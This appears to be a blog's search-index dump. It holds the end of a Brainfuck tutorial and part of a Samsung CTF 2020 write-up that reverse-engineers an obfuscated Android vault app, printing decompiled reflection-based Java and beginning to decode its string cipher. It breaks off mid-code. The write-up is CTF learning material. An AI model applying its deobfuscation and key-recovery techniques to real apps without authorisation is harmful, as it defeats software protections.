like:++++++++++[&gt;+++++++&gt;+++++++&gt;++++++++&gt;++++++++&gt;++++++++&gt;+++&gt;+++++++++&gt;++++++++&gt;++++++++&gt;++++++++&gt;+++++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;++.&gt;-.&gt;----.&gt;----.&gt;-.&gt;++.&gt;---.&gt;-.&gt;++.&gt;----.&gt;--.Way better than previous mammoth. But we can still reduce it. How? By reusing values. Suppose we have to print HE , H = 72 and E = 69 So why count again to 70 and subtract 2 if we can get same by subtracting 4 from H?Reusing Values : Optimization Part 2Let’s observe our string and stack again :In \"HELLO WORLD\" : Letter Count -&gt; Hx1, Ex1, Lx3, Ox2, Wx1, Dx1That means we can reduce at least 3 cells just by reusing L and E .Also, H -4= E -1 = D We need only 1 cell for these 3 charactersO -3 = L We need only 1 cell to show O and L and W — 5 = R , 1 cell for W and R .So at last we only need 3 cells for all letters of HELLO WORLD and +1 for loop control and +1 for blank space = total 5 cells for whole program instead of 12 we used earlier. We have reduced our memory usage to ~40% of previous implementation! That’s some good optimization! Well done.Now the code becomes :+++++ +++++ //LOOP 10 TIMES[&gt;+++++ ++ //SET VALUE TO 10x7=70&gt;+++++ +++ //SET VALUE TO 10x8=80&gt;+++ //SET VALUE TO 10x3=30&gt;+++++ ++++ //SET VALUE TO 10x9=90&lt;&lt;&lt;&lt;-]//NOW WE DO ADJUSTMENTS&gt;++. // 70 + 2 = 72 -&gt; H---. // 72 - 3 = 69 -&gt; E&gt;----. // 80 - 4 = 76 -&gt; L. // USING AGAIN TO PRINT -&gt; L+++. // 76 + 3 = 79 -&gt; O&gt;++. // 30 + 2 = 32 -&gt; SPACE&gt;---. // 90 - 3 = 87 -&gt; W&lt;&lt;. // REUSING CELL 3 -&gt; O&gt;&gt;-----. // 87 - 5 = 82 -&gt; R&lt;&lt;---. // REUSING CELL 3 -&gt; 79 - 3 = 76 -&gt; L&lt;-. // REUSING CELL 2 -&gt; 69 - 1 = 68 -&gt; D //FINAL CODE :++++++++++[&gt;+++++++&gt;++++++++&gt;+++&gt;+++++++++&lt;&lt;&lt;&lt;-]&gt;++.---.&gt;----..+++.&gt;++.&gt;---.&lt;&lt;.&gt;&gt;-----.&lt;&lt;---.&lt;-.Final Code =++++++++++[&gt;+++++++&gt;++++++++&gt;+++&gt;+++++++++&lt;&lt;&lt;&lt;-]&gt;++.---.&gt;----..+++.&gt;++.&gt;---.&lt;&lt;.&gt;&gt;-----.&lt;&lt;---.&lt;-.Which results in following stack :AWESOME! &amp; CONGRATS! now you have your own First Program in an Esoteric Language, Whatta Skill !ᕙ(⇀‸↼‶)ᕗ(╯°□°）╯︵ ┻━┻Further Practice and ConclusionSo that’s it ! Now I hope you will be able to write basic BF Codes and Flex your new skill to other geeks.One of the main skill to be developed by anyone who is programming is power of visualisation. One should be able to run the code in mind to certain degree to write effective code in any langauge, this might require more of that.BF is easy to learn and kinda hard to write code in. You need to plan your strategy in your mind before writing code. but this also stresses those brain cells which might help you grow your code-imagination power!Start with these simple questions and then release your imagination deamon: Q : Write a program in BF to print all ASCII printable characters Q : Write a program in BF to print your name. Q : Optimise these two programs in two ways: a. Minimum Code b. Minimum MemoryAdvance ProgramsThis Repository contains lots of good and complex codes to play around with.Below is a program I made, (Password Vault in BF) This program prints “SRT MSG” when provided correct key “P A S S” in ASCII or “80 65 83 83” in decimals; It takes 4 inputs for 4 characters. Then does ROT13 operation on the password characters and then maps the characters with reference to the calculated numbers and then prints the message using that character map.Check it out HERE\\\\ This program prints \"SRT MSG\" when provided correct key \"P A S S\" in Ascii or \"80 65 83 83\" in decimals; It takes 4 inputs for 4 characters. Then does ROT13 operation on the password characters and then maps the characters with reference to the calculated numbers and then prints the message using that character map. \\\\ Copyright (c) 2020 Saket Upadhyay [https://github.com/Saket-Upadhyay]\\\\ Distributed under MIT License.++++[++++&gt;---&lt;]&gt;++.-[---&gt;+&lt;]&gt;++.++++++.+++[-&gt;+++&lt;]&gt;.+++++++++++++.[--&gt;+++++&lt;]&gt;+++.[--&gt;+++++&lt;]&gt;.[-------&gt;++&lt;]&gt;+.--[---&gt;+&lt;]&gt;--..++++.--------.+++.--------------.[-----&gt;+++&lt;]&gt;++.&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;++[&gt;+++++&lt;-]&gt;.[-]&lt;,[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;++++++++++++++&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;&gt;+++++[&lt;-----&gt;-]&lt;&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;++++++++++++++&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;++++++++++++++&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;&gt;+++++[&lt;-----&gt;-]&lt;&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;++++++++++++++&lt;-[&gt;+&lt;-]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]&gt;.&lt;]&gt;&gt;,[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;++++++++++++++&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;&gt;+++++[&lt;-----&gt;-]&lt;&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;++++++++++++++&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;++++++++++++++&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;&gt;+++++[&lt;-----&gt;-]&lt;&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;++++++++++++++&lt;-[&gt;+&lt;-]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]&gt;.&lt;]&gt;&gt;,[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;++++++++++++++&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;&gt;+++++[&lt;-----&gt;-]&lt;&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;++++++++++++++&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;++++++++++++++&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;&gt;+++++[&lt;-----&gt;-]&lt;&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;++++++++++++++&lt;-[&gt;+&lt;-]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]&gt;.&lt;]&gt;&gt;,[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;++++++++++++++&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;&gt;+++++[&lt;-----&gt;-]&lt;&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;++++++++++++++&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;++++++++++++++&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;&gt;+++++[&lt;-----&gt;-]&lt;&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;++++++++++++++&lt;-[&gt;+&lt;-]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]&gt;.&lt;]&lt;&lt;&lt;&lt;&lt;++++++++++++++++.&gt;&gt;++++.++.&lt;++++++++++[&gt;&gt;+++&lt;&lt;-]&gt;&gt;++.&gt;+++++++.&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;------." }, { "title": "Samsung CTF App Reverse Eng. Writeup", "url": "/blog/posts/sstf-vault-wtireup/", "categories": "CTF, Android", "tags": "samsung ctf, android, reverse engineering", "date": "2020-08-18 12:12:12 +0530", "snippet": "A writeup of Reverse Engineering Challenge of Samsung CTF \"Hacker's Playground 2020\"Points : 500Solves : 15I took part in Samsung’s CTF event and tried to do some reverse engineering challenges, I was able to solve one but the sad part is i got the flag 1 min. after timeout so the points were not added :(Anyways this post is about my approach to the solution and the things learned from the challenge, so let’s get into that.What we get as a question.A file named Vault101.0.1-release.apk and a banner saying Can you get the password?BriefThe main goal of this challenge is Security in obscurity is not enough and we will get to know this as this application is heavily obfuscated and encrypted. But the weakness being once you understand the working and decode the obfuscation the data and the key is hardcoded and are not being obtained by some server or Keystore.That being said let’s get into the analysis. My approach in this is majorly Static Analysis and we will be using some custom scripts to recreate encryption algorithms. So this is gonna be long and detailed, I also wrote a smaller and compact version on Medium for all the people who don’t have enough time in life. READ IT HERE IF YOU ARE ONE OF THEMDecompilation and Initial AnalysisWe can decompile the application via anything we feel comfortable with, I chose JADX as this gives reasonable java code for the android application with the usable directory structure.After decompilation, the first step is pretty usual for everyone I think and that is finding the Main.java file as this is usually responsible for initial code of the application (and complicationSo after decompilation we got the following structure and it’s generally easy to find the Main.java at ./source/com/vendorname/.../Main.java and that works here too as we are greeted with the files below :We found ours at sources/com/sctf2020/vault101/And here is Main.java :package com.sctf2020.vault101;import a.b.k.e;public class MainActivity extends e implements OnClickListener { public EditText p; public Button q; public AnimatedVectorDrawable r; public volatile b.c.a.b s; public ServiceConnection t = new a(); public class a implements ServiceConnection { public a() {} public void onServiceConnected(ComponentName componentName, IBinder iBinder) { MainActivity.this.s = b.c.a.b.a.b(iBinder); MainActivity mainActivity = MainActivity.this; mainActivity.q.setOnClickListener(mainActivity); } public void onServiceDisconnected(ComponentName componentName) { MainActivity.this.s = null; MainActivity.this.q.setOnClickListener(null);}} public class b implements TextWatcher { public b() {} public void afterTextChanged(Editable editable) { MainActivity.this.q.setEnabled(editable.length() &gt; 0); } public void beforeTextChanged(CharSequence charSequence, int i, int i2, int i3) {} public void onTextChanged(CharSequence charSequence, int i, int i2, int i3) {}} public void onClick(View view) { try { boolean a2 = this.s.a(this.p.getText().toString()); Toast toast = new Toast(this); toast.setView(getLayoutInflater().inflate(a2 ? R.layout.toast_success_layout : R.layout.toast_fail_layout, (ViewGroup) findViewById(R.id.custom_toast_container))); toast.setGravity(17, 0, 0); toast.setDuration(1); toast.show(); if (!a2) {this.p.getText().clear();} } catch (RemoteException e) {e.printStackTrace();} } public void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView((int) R.layout.activity_main); this.q = (Button) findViewById(R.id.button); EditText editText = (EditText) findViewById(R.id.editText); this.p = editText; editText.addTextChangedListener(new b()); AnimatedVectorDrawable animatedVectorDrawable = (AnimatedVectorDrawable) ((ImageView) findViewById(R.id.imageView)).getDrawable(); this.r = animatedVectorDrawable; animatedVectorDrawable.start(); bindService(new Intent(this, VaultService.class), this.t, 1); } public void onDestroy() { super.onDestroy(); unbindService(this.t); } public void onResume() { super.onResume(); this.r.start();}}I have Removed the import part to save spaceAfter a brief walkthrough over code, we can see how we get our GOOD PASSWORD or BAD PASSWORD messages.Check out this part : try { boolean a2 = this.s.a(this.p.getText().toString()); Toast toast = new Toast(this); toast.setView(getLayoutInflater().inflate(a2 ? R.layout.toast_success_layout : R.layout.toast_fail_layout, (ViewGroup) findViewById(R.id.custom_toast_container))); toast.setGravity(17, 0, 0); toast.setDuration(1); toast.show(); if (!a2) { this.p.getText().clear(); }So when we get true from boolean function this.s.a() we say password is accepted.Also note that you won’t find any s\\a.java in the folder structure because see this :public volatile b.c.a.b s;It’s actually b.c.a.b.a() .So let’s go analyze all these crazy functions…Deep Analysis and Finding ObfuscationLet’s analyze all the functions, the plan is simple we will go branch by branch, i.e. : first analysis function X and if it calls Y we will go and check Y and come back when it returns.So back to our class b.c.a.b’s function a() :This is out b.javapackage b.c.a;import android.os.Binder;import android.os.IBinder;import android.os.IInterface;import android.os.Parcel;public interface b extends IInterface { public static abstract class a extends Binder implements b { public static class C0039a implements b { public IBinder f822a; public C0039a(IBinder iBinder) { this.f822a = iBinder; } public boolean a(String str) { Parcel obtain = Parcel.obtain(); Parcel obtain2 = Parcel.obtain(); try { obtain.writeInterfaceToken(\"com.sctf2020.vault101.IVault\"); obtain.writeString(str); boolean z = false; this.f822a.transact(1, obtain, obtain2, 0); obtain2.readException(); if (obtain2.readInt() != 0) {z = true;} return z; } finally { obtain2.recycle(); obtain.recycle();}} public IBinder asBinder() {return this.f822a;}} public a() {attachInterface(this, \"com.sctf2020.vault101.IVault\");} public static b b(IBinder iBinder) { if (iBinder == null) {return null;} IInterface queryLocalInterface = iBinder.queryLocalInterface(\"com.sctf2020.vault101.IVault\"); return (queryLocalInterface == null || !(queryLocalInterface instanceof b)) ? new C0039a(iBinder) : (b) queryLocalInterface; } public IBinder asBinder() {return this;} public boolean inTransact(int i, Parcel parcel, Parcel parcel2, int i2) { String str = \"com.sctf2020.vault101.IVault\"; if (i == 1) { parcel.enforceInterface(str); boolean a2 = a(parcel.readString()); parcel2.writeNoException(); parcel2.writeInt(a2 ? 1 : 0); return true; } else if (i != 1598968902){return super.onTransact(i, parcel, parcel2, i2);} else { parcel2.writeString(str);return true;}}} boolean a(String str);}so we called a(String _ourinput_) so this implimentation of a() in class b.java will be called :public boolean a(String str) { Parcel obtain = Parcel.obtain(); Parcel obtain2 = Parcel.obtain(); try { obtain.writeInterfaceToken(\"com.sctf2020.vault101.IVault\"); obtain.writeString(str); boolean z = false; this.f822a.transact(1, obtain, obtain2, 0); obtain2.readException(); if (obtain2.readInt() != 0) {\t\t\t\t z = true; } return z; } finally { obtain2.recycle(); obtain.recycle();} public IBinder asBinder() {return this.f822a;}}Which is just using Parcel to obtain the string and the app token to pass the data via transactSo let’s observe onTransact public boolean onTransact(int i, Parcel parcel, Parcel parcel2, int i2) { String str = \"com.sctf2020.vault101.IVault\"; if (i == 1) { parcel.enforceInterface(str); boolean a2 = a(parcel.readString()); parcel2.writeNoException(); parcel2.writeInt(a2 ? 1 : 0); return true;...Here we also see if we pass int 1 and then our 2 parcels, it will call boolean a2 = a(parcel.readString());Now this is function a() of extended a() in VaultService.java so let’s check that out.VaultService.java : Encrypted Class Extends b.c.a.b.a()VaultService.java extends a(String str) which is the new functionality invoked in previous : boolean a2 = a(parcel.readString());So let’s have a look at VaultService.javapackage com.sctf2020.vault101;import android.app.Service;import android.content.Intent;import android.os.IBinder;import java.lang.reflect.Array;import b.c.a.c;public class VaultService extends Service { public IBinder f873b = new b(null); public class b extends b.c.a.b.a { public int f874a; public b(a aVar) {} public boolean a(String str) { try { int i = this.f874a + 1; this.f874a = i; if (i &gt; 3) { Class.forName(c.d(\";È\\u0003p¯4Å¶orÂ\\\"Ý\\u0010|\", -500953648)).getMethod(c.d(\"qó%\", 991422357), new Class[]{(Class) Class.forName(c.d(\"~jxe\\u0005reíY:Bè`niaY\", 1069257791)).getDeclaredField(c.d(\"\\u0001ò¬\\u0010\", 1659367412)).get(null)}).invoke(null, new Object[]{Integer.valueOf(0)}); return false; } else if (str == null) { return false; } else { byte[] b2 = b.c.a.a.b((byte[]) Class.forName(c.d(\".Â®$\\u000fß1Ç\\u0003?Ú6Ê¶\\\"\", 1451800421)).getMethod(c.d(\"7Ì£\\u0002rØ0X\", -552283301), new Class[0]).invoke(str, new Object[0])); Object invoke = Class.forName(c.d(\"aogrfle¯}qjì.Cbsl35\", 823239689)).getMethod(c.d(\"$OX{Í\\u0010\", -2050089752), new Class[]{Class.forName(c.d(\"\\u000eé\", 937562454)), (Class) Class.forName(c.d(\";HCp¯\\u0005tå¶ohõ%LRtó\", -730536752)).getDeclaredField(c.d(\"\\u0014ø¡\\u0014\", -1215097919)).get(null)}).invoke(null, new Object[]{b2, Class.forName(c.d(\"pç\\u000bfÆ´!\\rÌ!BZ?Ë\\u000egÌëq\", -1393972808)).getDeclaredField(c.d(\"\\u001aä\\u0017Yï\\u0004\", 1778992991)).get(null)}); Object newInstance = Class.forName(c.d(\"~jxe\\u0005remY:Xrfb`c\", 1356052543)).getConstructor(new Class[]{Class.forName(c.d(\"[C\", 591904395))}).newInstance(new Object[]{invoke}); Object invoke2 = Class.forName(c.d(\"$Í\\u001efÆ4\\u0007:EH Í\\u000e:ê&gt;]-_\", -248372756)).getMethod(c.d(\"&amp;DÇ\\u0003ÿ\\u0016xg¬\", 64103114), new Class[]{(Class) Class.forName(c.d(\"/BNt\\u001fqç`ó1F_pÓ\", -401453852)).getDeclaredField(c.d(\"\\u0001ò\\u0004D\", 195131734)).get(null)}).invoke(VaultService.this, new Object[]{Integer.valueOf(R.string.magic)}); return ((Boolean) Class.forName(c.d(\"zhs`-ddmu.Rwb`kf\", -754317293)).getMethod(c.d(\"tø\\u001auÅ®\", 528601528), new Class[]{Class.forName(c.d(\"oâ5º!OÈzä\\u0016oæ \", -1620091986))}).invoke(invoke2, new Object[]{newInstance})).booleanValue(); } } catch (Throwable unused) { throw new RuntimeException(); } } } public IBinder onBind(Intent intent) {return this.f873b;} public void onCreate() { try { Object invoke = Class.forName(c.d(\"0Gqsn@q¥2noÿ4Ga/BF{ÿ4yu\", 1132272720)).getMethod(c.d(\"bf~VNeoô]wn÷\", 1545475118), new Class[0]).invoke(this, new Object[0]); Object invoke2 = Class.forName(c.d(\"!Ï#î5£.Ï%Ïó\\\"$Ò5Ó4ò\", 354045889)).getMethod(c.d(\"#Fä\\u0012uQyç#@ó»%Z\", 1074255429), new Class[]{(Class) Class.forName(c.d(\"ê1§£%Íúkêaî5û\", -72994916)).getDeclaredField(c.d(\"\\u0010zBE\", 1821340751)).get(null)}).invoke(invoke, new Object[]{Integer.valueOf(R.array.kind_of_magic)}); if (invoke2 != null) { int length = Array.getLength(invoke2); byte[] bArr = new byte[length]; for (int i = 0; i &lt; length; i++) { Object obj = Array.get(invoke2, i); Object invoke3 = Class.forName(c.d(\"uå&amp;Ä· \\rË Â\\u001a:É'Îèp\", 446383039)).getMethod(c.d(\" Fñ/mB\", 825348685), new Class[]{Class.forName(c.d(\"+À§ -Ì0Ç$.Ò3È¿&amp;\", 1167863618)), (Class) Class.forName(c.d(\"?Ê¨%\\u0007Ó5E\\u001a;Â\\u0000!Î¹![\", -521211012)).getDeclaredField(c.d(\"\\u0010zè\\u0010\", -1491966233)).get(null)}).invoke(null, new Object[]{obj, Class.forName(c.d(\"$M^fÆ\\u001et§!Bðka[gÌA$\", -1048288020)).getDeclaredField(c.d(\"\\nlÇ\\u0012qs@\", 282303079)).get(null)}); String d = c.d((CharSequence) Class.forName(c.d(\";HÁ1§\\u0001te¾kð.#@Ù7\", -158782760)).getConstructor(new Class[]{Class.forName(c.d(\"JË\", 543344920))}).newInstance(new Object[]{invoke3}), i ^ 137); bArr[i] = (byte) ((Character) Class.forName(c.d(\"k`Õ1¥(`oìjð$shÍ7\", 25375370)).getMethod(c.d(\"wã\\u000ffè«\", -375635523), new Class[]{(Class) Class.forName(c.d(\"oâ6`/ï!Ob/HOqæ'ds\", 1759650052)).getDeclaredField(c.d(\"\\u0000rÌ\\u0000\", 575374967)).get(null)}).invoke(d, new Object[]{Integer.valueOf(0)})).charValue(); } b.c.a.a.class.getDeclaredFields()[0].set(null, bArr); return; } throw new NullPointerException(); } catch (Throwable unused) { throw new RuntimeException(); } }}And yes, that’s where the actual headache starts! All the above class is encoded… but we see some significant leads, and here they are : This includes b.c.a.a class We have multiple instance of Class.forName(), invoke() and .getMethod() calls function d() of class c.java is used with varying variables passed.GetMethod(), Class.forName() and Invoke()On searching in java Docs (yes it exists) we can see that the GetClass() will actually do what it says…. gets the class by name and it is the same for others.SO HERE’S THE DEAL : If I say object = GetClass(“System”).getMethod(“out”).getMethod(“println”)And then I do object.invoke(null,new Object String(“HELLO WORLD”))I am actually doing : System.out.println(“HELLO WORLD”);So they are building their intended code by passing names of class which they are decoding somehow via d() function in c.javaAAAAAAAAAAAAAAAHHHHHHHHHHHHHHHHHHHHHHHH……..OKAY now let’s check d().Custom encryption in the app.so basically the c.java is the class responsible for all general encryption in the app. It’s the main source of the obfuscation in all the major library calls.Let’s C C.java hehe you saw what I did there.package b.c.a;public class c { public static int f823a; public static char a(char c, int i) { return (char) (c &amp; ((1 &lt;&lt; i) ^ 65535)); } public static char b(char c, int i) { return (char) (c | (1 &lt;&lt; i)); } public static char c(char c, int i) { return (char) ((c &amp; (1 &lt;&lt; i)) &gt;&gt; i); } public static String d(CharSequence charSequence, int i) { StringBuilder sb = new 